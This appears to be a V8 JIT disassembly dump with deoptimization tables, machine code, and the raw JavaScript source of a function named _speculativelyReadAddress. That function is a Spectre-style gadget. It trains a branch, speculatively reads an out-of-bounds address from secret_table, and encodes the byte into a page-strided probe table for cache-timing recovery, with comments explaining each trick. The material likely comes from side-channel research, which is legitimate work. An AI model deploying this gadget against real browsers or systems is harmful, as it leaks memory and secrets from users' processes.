0x622d186d52e  comment  (-- B65 start (deferred) --)
0x622d186d530  embedded object  (0x2c2783f95c81 <String[15]: training_number>)
0x622d186d539  comment  (-- <not inlined:931> --)
0x622d186d551  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x622d17cfb00)
0x622d186d555  comment  (-- B66 start (deferred) --)
0x622d186d557  embedded object  (0x2c2783f95ca9 <String[9]: page_size>)
0x622d186d560  comment  (-- <not inlined:898> --)
0x622d186d578  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x622d17cfb00)
0x622d186d57c  comment  (-- B67 start (deferred) --)
0x622d186d57e  embedded object  (0x2c2783f95c51 <String[23]: speculative_repetitions>)
0x622d186d587  comment  (-- <not inlined:819> --)
0x622d186d59f  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x622d17cfb00)
0x622d186d5a4  deopt script offset  (817)
0x622d186d5a4  deopt inlining id  (-1)
0x622d186d5a4  deopt reason  (not a Smi)
0x622d186d5a4  deopt index
0x622d186d5a5  runtime entry  (eager deoptimization bailout 0)
0x622d186d5a9  deopt script offset  (817)
0x622d186d5a9  deopt inlining id  (-1)
0x622d186d5a9  deopt reason  (not a Smi)
0x622d186d5a9  deopt index
0x622d186d5aa  runtime entry  (eager deoptimization bailout 1)
0x622d186d5ae  deopt script offset  (896)
0x622d186d5ae  deopt inlining id  (-1)
0x622d186d5ae  deopt reason  (not a Smi)
0x622d186d5ae  deopt index
0x622d186d5af  runtime entry  (eager deoptimization bailout 2)
0x622d186d5b3  deopt script offset  (896)
0x622d186d5b3  deopt inlining id  (-1)
0x622d186d5b3  deopt reason  (overflow)
0x622d186d5b3  deopt index
0x622d186d5b4  runtime entry  (eager deoptimization bailout 3)
0x622d186d5b8  deopt script offset  (879)
0x622d186d5b8  deopt inlining id  (-1)
0x622d186d5b8  deopt reason  ((unknown))
0x622d186d5b8  deopt index
0x622d186d5b9  runtime entry  (lazy deoptimization bailout 4)
0x622d186d5bd  deopt script offset  (950)
0x622d186d5bd  deopt inlining id  (-1)
0x622d186d5bd  deopt reason  (not a Smi)
0x622d186d5bd  deopt index
0x622d186d5be  runtime entry  (eager deoptimization bailout 5)
0x622d186d5c2  deopt script offset  (1111)
0x622d186d5c2  deopt inlining id  (-1)
0x622d186d5c2  deopt reason  (not a Smi)
0x622d186d5c2  deopt index
0x622d186d5c3  runtime entry  (eager deoptimization bailout 6)
0x622d186d5c7  deopt script offset  (1111)
0x622d186d5c7  deopt inlining id  (-1)
0x622d186d5c7  deopt reason  (overflow)
0x622d186d5c7  deopt index
0x622d186d5c8  runtime entry  (eager deoptimization bailout 7)
0x622d186d5cc  deopt script offset  (1175)
0x622d186d5cc  deopt inlining id  (-1)
0x622d186d5cc  deopt reason  (not a Smi)
0x622d186d5cc  deopt index
0x622d186d5cd  runtime entry  (eager deoptimization bailout 8)
0x622d186d5d1  deopt script offset  (1175)
0x622d186d5d1  deopt inlining id  (-1)
0x622d186d5d1  deopt reason  (overflow)
0x622d186d5d1  deopt index
0x622d186d5d2  runtime entry  (eager deoptimization bailout 9)
0x622d186d5d6  deopt script offset  (1336)
0x622d186d5d6  deopt inlining id  (-1)
0x622d186d5d6  deopt reason  (not a Smi)
0x622d186d5d6  deopt index
0x622d186d5d7  runtime entry  (eager deoptimization bailout 10)
0x622d186d5db  deopt script offset  (1461)
0x622d186d5db  deopt inlining id  (-1)
0x622d186d5db  deopt reason  (wrong map)
0x622d186d5db  deopt index
0x622d186d5dc  runtime entry  (eager deoptimization bailout 11)
0x622d186d5e0  deopt script offset  (1461)
0x622d186d5e0  deopt inlining id  (-1)
0x622d186d5e0  deopt reason  (out of bounds)
0x622d186d5e0  deopt index
0x622d186d5e1  runtime entry  (eager deoptimization bailout 12)
0x622d186d5e5  deopt script offset  (1550)
0x622d186d5e5  deopt inlining id  (-1)
0x622d186d5e5  deopt reason  (Smi)
0x622d186d5e5  deopt index
0x622d186d5e6  runtime entry  (eager deoptimization bailout 13)
0x622d186d5ea  deopt script offset  (1550)
0x622d186d5ea  deopt inlining id  (-1)
0x622d186d5ea  deopt reason  (wrong map)
0x622d186d5ea  deopt index
0x622d186d5eb  runtime entry  (eager deoptimization bailout 14)
0x622d186d5ef  deopt script offset  (1550)
0x622d186d5ef  deopt inlining id  (-1)
0x622d186d5ef  deopt reason  (out of bounds)
0x622d186d5ef  deopt index
0x622d186d5f0  runtime entry  (eager deoptimization bailout 15)
0x622d186d5f4  deopt script offset  (1762)
0x622d186d5f4  deopt inlining id  (-1)
0x622d186d5f4  deopt reason  (overflow)
0x622d186d5f4  deopt index
0x622d186d5f5  runtime entry  (eager deoptimization bailout 16)
0x622d186d5f9  deopt script offset  (1742)
0x622d186d5f9  deopt inlining id  (-1)
0x622d186d5f9  deopt reason  (Smi)
0x622d186d5f9  deopt index
0x622d186d5fa  runtime entry  (eager deoptimization bailout 17)
0x622d186d5fe  deopt script offset  (1742)
0x622d186d5fe  deopt inlining id  (-1)
0x622d186d5fe  deopt reason  (wrong map)
0x622d186d5fe  deopt index
0x622d186d5ff  runtime entry  (eager deoptimization bailout 18)
0x622d186d603  deopt script offset  (1742)
0x622d186d603  deopt inlining id  (-1)
0x622d186d603  deopt reason  (out of bounds)
0x622d186d603  deopt index
0x622d186d604  runtime entry  (eager deoptimization bailout 19)
0x622d186d608  deopt script offset  (957)
0x622d186d608  deopt inlining id  (-1)
0x622d186d608  deopt reason  (overflow)
0x622d186d608  deopt index
0x622d186d609  runtime entry  (eager deoptimization bailout 20)
0x622d186d60d  deopt script offset  (1111)
0x622d186d60d  deopt inlining id  (-1)
0x622d186d60d  deopt reason  (overflow)
0x622d186d60d  deopt index
0x622d186d60e  runtime entry  (eager deoptimization bailout 21)
0x622d186d612  deopt script offset  (1175)
0x622d186d612  deopt inlining id  (-1)
0x622d186d612  deopt reason  (overflow)
0x622d186d612  deopt index
0x622d186d613  runtime entry  (eager deoptimization bailout 22)
0x622d186d617  deopt script offset  (1336)
0x622d186d617  deopt inlining id  (-1)
0x622d186d617  deopt reason  (not a Smi)
0x622d186d617  deopt index
0x622d186d618  runtime entry  (eager deoptimization bailout 23)
0x622d186d61c  deopt script offset  (1461)
0x622d186d61c  deopt inlining id  (-1)
0x622d186d61c  deopt reason  (out of bounds)
0x622d186d61c  deopt index
0x622d186d61d  runtime entry  (eager deoptimization bailout 24)
0x622d186d621  deopt script offset  (1550)
0x622d186d621  deopt inlining id  (-1)
0x622d186d621  deopt reason  (Smi)
0x622d186d621  deopt index
0x622d186d622  runtime entry  (eager deoptimization bailout 25)
0x622d186d626  deopt script offset  (1550)
0x622d186d626  deopt inlining id  (-1)
0x622d186d626  deopt reason  (wrong map)
0x622d186d626  deopt index
0x622d186d627  runtime entry  (eager deoptimization bailout 26)
0x622d186d62b  deopt script offset  (1550)
0x622d186d62b  deopt inlining id  (-1)
0x622d186d62b  deopt reason  (out of bounds)
0x622d186d62b  deopt index
0x622d186d62c  runtime entry  (eager deoptimization bailout 27)
0x622d186d630  deopt script offset  (1762)
0x622d186d630  deopt inlining id  (-1)
0x622d186d630  deopt reason  (overflow)
0x622d186d630  deopt index
0x622d186d631  runtime entry  (eager deoptimization bailout 28)
0x622d186d635  deopt script offset  (1742)
0x622d186d635  deopt inlining id  (-1)
0x622d186d635  deopt reason  (Smi)
0x622d186d635  deopt index
0x622d186d636  runtime entry  (eager deoptimization bailout 29)
0x622d186d63a  deopt script offset  (1742)
0x622d186d63a  deopt inlining id  (-1)
0x622d186d63a  deopt reason  (wrong map)
0x622d186d63a  deopt index
0x622d186d63b  runtime entry  (eager deoptimization bailout 30)
0x622d186d63f  deopt script offset  (1742)
0x622d186d63f  deopt inlining id  (-1)
0x622d186d63f  deopt reason  (out of bounds)
0x622d186d63f  deopt index
0x622d186d640  runtime entry  (eager deoptimization bailout 31)
0x622d186d644  deopt script offset  (957)
0x622d186d644  deopt inlining id  (-1)
0x622d186d644  deopt reason  (overflow)
0x622d186d644  deopt index
0x622d186d645  runtime entry  (eager deoptimization bailout 32)
0x622d186d649  deopt script offset  (846)
0x622d186d649  deopt inlining id  (-1)
0x622d186d649  deopt reason  (overflow)
0x622d186d649  deopt index
0x622d186d64a  runtime entry  (eager deoptimization bailout 33)
0x622d186d64e  deopt script offset  (1846)
0x622d186d64e  deopt inlining id  (-1)
0x622d186d64e  deopt reason  (wrong call target)
0x622d186d64e  deopt index
0x622d186d64f  runtime entry  (eager deoptimization bailout 34)
0x622d186d653  deopt script offset  (799)
0x622d186d653  deopt inlining id  (-1)
0x622d186d653  deopt reason  ((unknown))
0x622d186d653  deopt index
0x622d186d654  runtime entry  (lazy deoptimization bailout 35)
0x622d186d658  deopt script offset  (918)
0x622d186d658  deopt inlining id  (-1)
0x622d186d658  deopt reason  ((unknown))
0x622d186d658  deopt index
0x622d186d659  runtime entry  (lazy deoptimization bailout 36)
0x622d186d65d  deopt script offset  (1111)
0x622d186d65d  deopt inlining id  (-1)
0x622d186d65d  deopt reason  (minus zero)
0x622d186d65d  deopt index
0x622d186d65e  runtime entry  (eager deoptimization bailout 37)
0x622d186d662  deopt script offset  (1175)
0x622d186d662  deopt inlining id  (-1)
0x622d186d662  deopt reason  (minus zero)
0x622d186d662  deopt index
0x622d186d663  runtime entry  (eager deoptimization bailout 38)
0x622d186d667  deopt script offset  (918)
0x622d186d667  deopt inlining id  (-1)
0x622d186d667  deopt reason  ((unknown))
0x622d186d667  deopt index
0x622d186d668  runtime entry  (lazy deoptimization bailout 39)
0x622d186d66c  deopt script offset  (1111)
0x622d186d66c  deopt inlining id  (-1)
0x622d186d66c  deopt reason  (minus zero)
0x622d186d66c  deopt index
0x622d186d66d  runtime entry  (eager deoptimization bailout 40)
0x622d186d671  deopt script offset  (1175)
0x622d186d671  deopt inlining id  (-1)
0x622d186d671  deopt reason  (minus zero)
0x622d186d671  deopt index
0x622d186d672  runtime entry  (eager deoptimization bailout 41)
0x622d186d676  deopt script offset  (1723)
0x622d186d676  deopt inlining id  (-1)
0x622d186d676  deopt reason  ((unknown))
0x622d186d676  deopt index
0x622d186d677  runtime entry  (lazy deoptimization bailout 42)
0x622d186d67b  deopt script offset  (1538)
0x622d186d67b  deopt inlining id  (-1)
0x622d186d67b  deopt reason  ((unknown))
0x622d186d67b  deopt index
0x622d186d67c  runtime entry  (lazy deoptimization bailout 43)
0x622d186d680  deopt script offset  (1314)
0x622d186d680  deopt inlining id  (-1)
0x622d186d680  deopt reason  ((unknown))
0x622d186d680  deopt index
0x622d186d681  runtime entry  (lazy deoptimization bailout 44)
0x622d186d685  deopt script offset  (1165)
0x622d186d685  deopt inlining id  (-1)
0x622d186d685  deopt reason  ((unknown))
0x622d186d685  deopt index
0x622d186d686  runtime entry  (lazy deoptimization bailout 45)
0x622d186d68a  deopt script offset  (1103)
0x622d186d68a  deopt inlining id  (-1)
0x622d186d68a  deopt reason  ((unknown))
0x622d186d68a  deopt index
0x622d186d68b  runtime entry  (lazy deoptimization bailout 46)
0x622d186d68f  deopt script offset  (931)
0x622d186d68f  deopt inlining id  (-1)
0x622d186d68f  deopt reason  ((unknown))
0x622d186d68f  deopt index
0x622d186d690  runtime entry  (lazy deoptimization bailout 47)
0x622d186d694  deopt script offset  (898)
0x622d186d694  deopt inlining id  (-1)
0x622d186d694  deopt reason  ((unknown))
0x622d186d694  deopt index
0x622d186d695  runtime entry  (lazy deoptimization bailout 48)
0x622d186d699  deopt script offset  (819)
0x622d186d699  deopt inlining id  (-1)
0x622d186d699  deopt reason  ((unknown))
0x622d186d699  deopt index
0x622d186d69a  runtime entry  (lazy deoptimization bailout 49)
0x622d186d6a0  comment  (;;; Safepoint table.)

--- End code ---
41
--- Raw source ---
() {
    const probe_table = new Uint8Array((1 + probe_length) * page_size);
    // run the speculative execution at least twice
    // the first run causes secret_table[fixed_index] to be loaded from RAM (cache miss)
    // this means that the speculative branch takes long to execute and thus is likely to get caught by the branch rollback
    // the second time that the speculative execution runs, secret_table[fixed_index] is already cached and therefore fast
    for (let j = 0; j < speculative_repetitions; ++j) {
        const delay_array = new Uint8Array(2 * page_size);
        for (let i = training_number; i > 0; --i) {
            // helper variables to optimize assembly code
            const invalid_access = (i == 1) | 0;
            const fixed_address = address * invalid_access;
            const fixed_page_size = page_size * invalid_access;
            // if (invalid_access) {
            // }
            // ensure evaluation before jump condition
            junk ^= fixed_address | fixed_page_size;
            // load condition from RAM so speculative execution gets triggered
            if (delay_array[fixed_page_size] || !invalid_access) {
                const secret_value = secret_table[fixed_address];
                // map valid accesses to the address (probe_tables)
                // map invalid accesses to their respective probe boxes
                junk ^= probe_table[(1 + secret_value) * fixed_page_size & 0xffffff];
            }
        }
    }
    // probe table
    probeTable(probe_table);
}


--- Optimized code ---
optimization_id = 1
source_position = 330
kind = OPTIMIZED_FUNCTION
name = _speculativelyReadAddress
stack_slots = 13
compiler = turbofan
address = 0x622d186d781

Instructions (size = 1156)
                  -- <not inlined:330> --
                  -- Prologue: check for deoptimization --
0x622d186d7c0     0  488b59e0       REX.W movq rbx,[rcx-0x20]
0x622d186d7c4     4  f6430f01       testb [rbx+0xf],0x1
0x622d186d7c8     8  0f855217f2ff   jnz 0x622d178ef20  (CompileLazyDeoptimizedCode)    ;; code: Builtin::CompileLazyDeoptimizedCode
                  -- B0 start (construct frame) --
0x622d186d7ce     e  55             push rbp
0x622d186d7cf     f  4889e5         REX.W movq rbp,rsp
0x622d186d7d2    12  56             push rsi
0x622d186d7d3    13  57             push rdi
0x622d186d7d4    14  4883ec48       REX.W subq rsp,0x48
0x622d186d7d8    18  488975e8       REX.W movq [rbp-0x18],rsi
0x622d186d7dc    1c  493ba5f80f0000 REX.W cmpq rsp,[r13+0xff8] (root (32764))
0x622d186d7e3    23  0f869d020000   jna 0x622d186da86  <+0x2c6>
                  -- B2 start --
                  -- B3 start --
                  -- <not inlined:359> --
0x622d186d7e9    29  488b75e8       REX.W movq rsi,[rbp-0x18]
0x622d186d7ed    2d  498b55a0       REX.W movq rdx,[r13-0x60] (root (0x2b18c95025b1 <undefined>))
0x622d186d7f1    31  48b90000000070871700 REX.W movq rcx,0x17877000000000
0x622d186d7fb    3b  48b8e927d13b2a3b0000 REX.W movq rax,0x3b2a3bd127e9    ;; object: 0x3b2a3bd127e9 <JSFunction Uint8Array (sfi = 0x18d859c94b01)>
0x622d186d805    45  488bfa         REX.W movq rdi,rdx
0x622d186d808    48  4c8bc2         REX.W movq r8,rdx
0x622d186d80b    4b  488bd8         REX.W movq rbx,rax
0x622d186d80e    4e  4c8bc8         REX.W movq r9,rax
0x622d186d811    51  e84ae1f5ff     call 0x622d17cb960  (CreateTypedArray)    ;; code: Builtin::CreateTypedArray
0x622d186d816    56  488945b0       REX.W movq [rbp-0x50],rax
0x622d186d81a    5a  33db           xorl rbx,rbx
0x622d186d81c    5c  0f1f4000       nop
                  -- B4 start (loop up to 28) --
                  -- <not inlined:817> --
0x622d186d820    60  33c0           xorl rax,rax
0x622d186d822    62  48895db8       REX.W movq [rbp-0x48],rbx
0x622d186d826    66  83fb0a         cmpl rbx,0xa
0x622d186d829    69  0f834c020000   jnc 0x622d186da7b  <+0x2bb>
                  -- B5 start (in loop 4) --
                  -- <not inlined:799> --
0x622d186d82f    6f  493ba5f80f0000 REX.W cmpq rsp,[r13+0xff8] (root (32764))
0x622d186d836    76  0f8664020000   jna 0x622d186daa0  <+0x2e0>
                  -- B7 start (in loop 4) --
                  -- B8 start (in loop 4) --
                  -- <not inlined:879> --
0x622d186d83c    7c  48b900000000e02e0000 REX.W movq rcx,0x2ee000000000
0x622d186d846    86  4c8bc8         REX.W movq r9,rax
0x622d186d849    89  48b8e927d13b2a3b0000 REX.W movq rax,0x3b2a3bd127e9    ;; object: 0x3b2a3bd127e9 <JSFunction Uint8Array (sfi = 0x18d859c94b01)>
0x622d186d853    93  498b55a0       REX.W movq rdx,[r13-0x60] (root (0x2b18c95025b1 <undefined>))
0x622d186d857    97  4c8bc3         REX.W movq r8,rbx
0x622d186d85a    9a  488b75e8       REX.W movq rsi,[rbp-0x18]
0x622d186d85e    9e  488bfa         REX.W movq rdi,rdx
0x622d186d861    a1  488bd8         REX.W movq rbx,rax
0x622d186d864    a4  e8f7e0f5ff     call 0x622d17cb960  (CreateTypedArray)    ;; code: Builtin::CreateTypedArray
                  -- <not inlined:918> --
0x622d186d869    a9  488945c0       REX.W movq [rbp-0x40],rax
0x622d186d86d    ad  493ba5f80f0000 REX.W cmpq rsp,[r13+0xff8] (root (32764))
0x622d186d874    b4  0f8643020000   jna 0x622d186dabd  <+0x2fd>
                  -- B10 start (in loop 4) --
                  -- B11 start (in loop 4) --
                  -- <not inlined:1314> --
0x622d186d87a    ba  48bb69d8293b97360000 REX.W movq rbx,0x36973b29d869    ;; object: 0x36973b29d869 <FunctionContext[12]>
0x622d186d884    c4  488b532f       REX.W movq rdx,[rbx+0x2f]
0x622d186d888    c8  493955a8       REX.W cmpq [r13-0x58] (root (0x2b18c9502691 <the_hole>)),rdx
0x622d186d88c    cc  0f8401030000   jz 0x622d186db93  <+0x3d3>
                  -- B12 start (in loop 4) --
                  -- <not inlined:1336> --
0x622d186d892    d2  488bca         REX.W movq rcx,rdx
0x622d186d895    d5  48c1e920       REX.W shrq rcx, 32
0x622d186d899    d9  f6c201         testb rdx,0x1
0x622d186d89c    dc  0f8541030000   jnz 0x622d186dbe3  <+0x423>
                  -- <not inlined:1319> --
0x622d186d8a2    e2  488bd1         REX.W movq rdx,rcx
0x622d186d8a5    e5  48c1e220       REX.W shlq rdx, 32
0x622d186d8a9    e9  4889532f       REX.W movq [rbx+0x2f],rdx
                  -- <not inlined:1461> --
0x622d186d8ad    ed  48be81476012c0080000 REX.W movq rsi,0x8c012604781    ;; object: 0x08c012604781 <Map(UINT8_ELEMENTS)>
0x622d186d8b7    f7  483970ff       REX.W cmpq [rax-0x1],rsi
0x622d186d8bb    fb  0f8527030000   jnz 0x622d186dbe8  <+0x428>
0x622d186d8c1   101  8b7833         movl rdi,[rax+0x33]
0x622d186d8c4   104  4c8b4017       REX.W movq r8,[rax+0x17]
0x622d186d8c8   108  4c8b480f       REX.W movq r9,[rax+0xf]
0x622d186d8cc   10c  4d8b4917       REX.W movq r9,[r9+0x17]
0x622d186d8d0   110  83ff00         cmpl rdi,0x0
0x622d186d8d3   113  0f8614030000   jna 0x622d186dbed  <+0x42d>
                  -- <not inlined:1550> --
0x622d186d8d9   119  49bb59d9293b97360000 REX.W movq r11,0x36973b29d959    ;; object: 0x36973b29d959 <Uint8Array map = 0x8c012604781>
0x622d186d8e3   123  493973ff       REX.W cmpq [r11-0x1],rsi
0x622d186d8e7   127  0f8505030000   jnz 0x622d186dbf2  <+0x432>
0x622d186d8ed   12d  4d8b6317       REX.W movq r12,[r11+0x17]
0x622d186d8f1   131  4d8b730f       REX.W movq r14,[r11+0xf]
0x622d186d8f5   135  458b7b33       movl r15,[r11+0x33]
0x622d186d8f9   139  4d8b7617       REX.W movq r14,[r14+0x17]
0x622d186d8fd   13d  4183ff00       cmpl r15,0x0
0x622d186d901   141  0f86f0020000   jna 0x622d186dbf7  <+0x437>
0x622d186d907   147  450fb626       movzxbl r12,[r14]
                  -- <not inlined:1723> --
0x622d186d90b   14b  48897da8       REX.W movq [rbp-0x58],rdi
0x622d186d90f   14f  4c8945c8       REX.W movq [rbp-0x38],r8
0x622d186d913   153  493955a8       REX.W cmpq [r13-0x58] (root (0x2b18c9502691 <the_hole>)),rdx
0x622d186d917   157  0f843a020000   jz 0x622d186db57  <+0x397>
                  -- B13 start (in loop 4) --
                  -- <not inlined:1742> --
0x622d186d91d   15d  488b55b0       REX.W movq rdx,[rbp-0x50]
0x622d186d921   161  483972ff       REX.W cmpq [rdx-0x1],rsi
0x622d186d925   165  0f85d1020000   jnz 0x622d186dbfc  <+0x43c>
0x622d186d92b   16b  4c8b6217       REX.W movq r12,[rdx+0x17]
0x622d186d92f   16f  4c8b720f       REX.W movq r14,[rdx+0xf]
0x622d186d933   173  448b7a33       movl r15,[rdx+0x33]
0x622d186d937   177  4d8b7617       REX.W movq r14,[r14+0x17]
0x622d186d93b   17b  4183ff00       cmpl r15,0x0
0x622d186d93f   17f  0f86bc020000   jna 0x622d186dc01  <+0x441>
0x622d186d945   185  450fb626       movzxbl r12,[r14]
0x622d186d949   189  4433e1         xorl r12,rcx
                  -- <not inlined:1728> --
0x622d186d94c   18c  49c1e420       REX.W shlq r12, 32
0x622d186d950   190  4c89632f       REX.W movq [rbx+0x2f],r12
0x622d186d954   194  b905000000     movl rcx,0x5
0x622d186d959   199  0f1f8000000000 nop
                  -- B14 start (loop up to 27) (in loop 4) --
                  -- <not inlined:950> --
0x622d186d960   1a0  48894de0       REX.W movq [rbp-0x20],rcx
0x622d186d964   1a4  83f900         cmpl rcx,0x0
0x622d186d967   1a7  0f8602010000   jna 0x622d186da6f  <+0x2af>
                  -- B15 start (in loop 14) --
                  -- <not inlined:918> --
0x622d186d96d   1ad  493ba5f80f0000 REX.W cmpq rsp,[r13+0xff8] (root (32764))
0x622d186d974   1b4  0f865e010000   jna 0x622d186dad8  <+0x318>
                  -- B17 start (in loop 14) --
                  -- B18 start (in loop 14) --
                  -- <not inlined:1058> --
0x622d186d97a   1ba  83f901         cmpl rcx,0x1
0x622d186d97d   1bd  410f94c4       setzl r12l
0x622d186d981   1c1  450fb6e4       movzxbl r12,r12
                  -- <not inlined:1314> --
0x622d186d985   1c5  4c8b732f       REX.W movq r14,[rbx+0x2f]
                  -- <not inlined:1175> --
0x622d186d989   1c9  4569fc70170000 imull r15,r12,0x1770
                  -- <not inlined:1111> --
0x622d186d990   1d0  4169c4c8000000 imull rax,r12,0xc8
                  -- <not inlined:1314> --
0x622d186d997   1d7  4c8965d8       REX.W movq [rbp-0x28],r12
0x622d186d99b   1db  4d3975a8       REX.W cmpq [r13-0x58] (root (0x2b18c9502691 <the_hole>)),r14
0x622d186d99f   1df  0f8495010000   jz 0x622d186db3a  <+0x37a>
                  -- B19 start (in loop 14) --
                  -- <not inlined:1336> --
0x622d186d9a5   1e5  4c8bc0         REX.W movq r8,rax
0x622d186d9a8   1e8  450bc7         orl r8,r15
0x622d186d9ab   1eb  498bce         REX.W movq rcx,r14
0x622d186d9ae   1ee  48c1e920       REX.W shrq rcx, 32
0x622d186d9b2   1f2  4433c1         xorl r8,rcx
0x622d186d9b5   1f5  41f6c601       testb r14,0x1
0x622d186d9b9   1f9  0f8547020000   jnz 0x622d186dc06  <+0x446>
                  -- <not inlined:1723> --
0x622d186d9bf   1ff  498bc8         REX.W movq rcx,r8
0x622d186d9c2   202  48c1e120       REX.W shlq rcx, 32
                  -- <not inlined:1319> --
0x622d186d9c6   206  48894b2f       REX.W movq [rbx+0x2f],rcx
                  -- <not inlined:1461> --
0x622d186d9ca   20a  443bff         cmpl r15,rdi
0x622d186d9cd   20d  0f8338020000   jnc 0x622d186dc0b  <+0x44b>
0x622d186d9d3   213  470fb63439     movzxbl r14,[r9+r15*1]
0x622d186d9d8   218  4183fe00       cmpl r14,0x0
0x622d186d9dc   21c  0f850a000000   jnz 0x622d186d9ec  <+0x22c>
                  -- B20 start (in loop 14) --
                  -- B21 start (in loop 14) --
                  -- <not inlined:1483> --
0x622d186d9e2   222  4183fc00       cmpl r12,0x0
0x622d186d9e6   226  0f8573000000   jnz 0x622d186da5f  <+0x29f>
                  -- B22 start (in loop 14) --
                  -- B23 start (in loop 14) --
                  -- B24 start (in loop 14) --
                  -- <not inlined:1550> --
0x622d186d9ec   22c  493973ff       REX.W cmpq [r11-0x1],rsi
0x622d186d9f0   230  0f851a020000   jnz 0x622d186dc10  <+0x450>
0x622d186d9f6   236  4d8b7317       REX.W movq r14,[r11+0x17]
0x622d186d9fa   23a  4d8b630f       REX.W movq r12,[r11+0xf]
0x622d186d9fe   23e  418b7b33       movl rdi,[r11+0x33]
0x622d186da02   242  4d8b642417     REX.W movq r12,[r12+0x17]
0x622d186da07   247  3bc7           cmpl rax,rdi
0x622d186da09   249  0f8306020000   jnc 0x622d186dc15  <+0x455>
0x622d186da0f   24f  410fb63c04     movzxbl rdi,[r12+rax*1]
                  -- <not inlined:1723> --
0x622d186da14   254  49394da8       REX.W cmpq [r13-0x58] (root (0x2b18c9502691 <the_hole>)),rcx
0x622d186da18   258  0f8403010000   jz 0x622d186db21  <+0x361>
                  -- B25 start (in loop 14) --
                  -- <not inlined:1742> --
0x622d186da1e   25e  483972ff       REX.W cmpq [rdx-0x1],rsi
0x622d186da22   262  0f85f2010000   jnz 0x622d186dc1a  <+0x45a>
                  -- <not inlined:1746> --
0x622d186da28   268  8d4f01         leal rcx,[rdi+0x1]
                  -- <not inlined:1742> --
0x622d186da2b   26b  488b7a17       REX.W movq rdi,[rdx+0x17]
                  -- <not inlined:1762> --
0x622d186da2f   26f  410fafcf       imull rcx,r15
                  -- <not inlined:1742> --
0x622d186da33   273  4c8b620f       REX.W movq r12,[rdx+0xf]
0x622d186da37   277  448b7233       movl r14,[rdx+0x33]
                  -- <not inlined:1780> --
0x622d186da3b   27b  81e1ffffff00   andl rcx,0xffffff
                  -- <not inlined:1742> --
0x622d186da41   281  4d8b642417     REX.W movq r12,[r12+0x17]
0x622d186da46   286  413bce         cmpl rcx,r14
0x622d186da49   289  0f83d0010000   jnc 0x622d186dc1f  <+0x45f>
0x622d186da4f   28f  410fb6040c     movzxbl rax,[r12+rcx*1]
0x622d186da54   294  4133c0         xorl rax,r8
                  -- <not inlined:1728> --
0x622d186da57   297  48c1e020       REX.W shlq rax, 32
0x622d186da5b   29b  4889432f       REX.W movq [rbx+0x2f],rax
                  -- B26 start (in loop 14) --
                  -- <not inlined:957> --
0x622d186da5f   29f  488b4de0       REX.W movq rcx,[rbp-0x20]
0x622d186da63   2a3  83e901         subl rcx,0x1
0x622d186da66   2a6  488b7da8       REX.W movq rdi,[rbp-0x58]
0x622d186da6a   2aa  e9f1feffff     jmp 0x622d186d960  <+0x1a0>
                  -- B27 start (in loop 4) --
                  -- <not inlined:846> --
0x622d186da6f   2af  488b45b8       REX.W movq rax,[rbp-0x48]
0x622d186da73   2b3  8d5801         leal rbx,[rax+0x1]
0x622d186da76   2b6  e9a5fdffff     jmp 0x622d186d820  <+0x60>
                  -- B28 start (deconstruct frame) --
                  -- <not inlined:1871> --
0x622d186da7b   2bb  498b45a0       REX.W movq rax,[r13-0x60] (root (0x2b18c95025b1 <undefined>))
0x622d186da7f   2bf  488be5         REX.W movq rsp,rbp
0x622d186da82   2c2  5d             pop rbp
0x622d186da83   2c3  c20800         ret 0x8
                  -- B35 start (no frame) --
                  -- B1 start (deferred) --
                  -- <not inlined:330> --
0x622d186da86   2c6  48bbb093190100000000 REX.W movq rbx,0x11993b0
0x622d186da90   2d0  33c0           xorl rax,rax
0x622d186da92   2d2  488b75e8       REX.W movq rsi,[rbp-0x18]
0x622d186da96   2d6  e86520f6ff     call 0x622d17cfb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
0x622d186da9b   2db  e949fdffff     jmp 0x622d186d7e9  <+0x29>
                  -- B6 start (deferred) (in loop 4) --
                  -- <not inlined:799> --
0x622d186daa0   2e0  488b1de1ffffff REX.W movq rbx,[rip+0xffffffe1]
0x622d186daa7   2e7  33c0           xorl rax,rax
0x622d186daa9   2e9  488b75e8       REX.W movq rsi,[rbp-0x18]
0x622d186daad   2ed  e84e20f6ff     call 0x622d17cfb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
0x622d186dab2   2f2  33c0           xorl rax,rax
0x622d186dab4   2f4  488b5db8       REX.W movq rbx,[rbp-0x48]
0x622d186dab8   2f8  e97ffdffff     jmp 0x622d186d83c  <+0x7c>
                  -- B9 start (deferred) (in loop 4) --
                  -- <not inlined:918> --
0x622d186dabd   2fd  488b1dc4ffffff REX.W movq rbx,[rip+0xffffffc4]
0x622d186dac4   304  33c0           xorl rax,rax
0x622d186dac6   306  488b75e8       REX.W movq rsi,[rbp-0x18]
0x622d186daca   30a  e83120f6ff     call 0x622d17cfb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
0x622d186dacf   30f  488b45c0       REX.W movq rax,[rbp-0x40]
0x622d186dad3   313  e9a2fdffff     jmp 0x622d186d87a  <+0xba>
                  -- B16 start (deferred) (in loop 14) --
0x622d186dad8   318  4c894dd0       REX.W movq [rbp-0x30],r9
0x622d186dadc   31c  488b1da5ffffff REX.W movq rbx,[rip+0xffffffa5]
0x622d186dae3   323  33c0           xorl rax,rax
0x622d186dae5   325  488b75e8       REX.W movq rsi,[rbp-0x18]
0x622d186dae9   329  e81220f6ff     call 0x622d17cfb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
0x622d186daee   32e  488b7da8       REX.W movq rdi,[rbp-0x58]
0x622d186daf2   332  488b55b0       REX.W movq rdx,[rbp-0x50]
0x622d186daf6   336  488b4de0       REX.W movq rcx,[rbp-0x20]
0x622d186dafa   33a  48bb69d8293b97360000 REX.W movq rbx,0x36973b29d869    ;; object: 0x36973b29d869 <FunctionContext[12]>
